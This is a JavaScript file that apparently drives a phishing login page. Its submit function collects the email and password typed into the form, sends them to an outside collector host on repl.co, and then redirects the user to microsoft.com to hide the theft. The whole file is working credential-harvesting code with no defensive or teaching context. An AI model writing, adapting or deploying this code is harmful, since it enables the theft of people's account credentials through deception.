
const third = document.getElementById('third')
const second = document.getElementById('second')

async function submit() {
  const userEmail = document.getElementById("email");
  const password = document.getElementById("password");

  const data = {
    "email": userEmail.value,
    "password": password.value
  };

  console.log(data);

  await fetch('https://databasecollector2.angry-creator.repl.co/', {
    method: "POST",
    mode: "cors",
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  })
    .then((response) => response.json())
    .then((data) => console.log(data)).finally(() => {
      window.location.href = "https://www.microsoft.com/";
    });
}

const submitBtn = document.getElementsByClassName("submitBtn")[0];

submitBtn.onclick = (event) => {
  event.preventDefault();
  submit();
}

function revealPassword() {
    var checkbox = document.getElementById("revealPasswordCheckbox");
    var password = document.getElementById("password");
    if (checkbox.checked) {
      password.type = "text";
    } else {
      password.type = "password";
    }
  }
  





function next(current){
    if(current ==='second'){
        second.style.display='none';
        third.style.display='block';
    }
}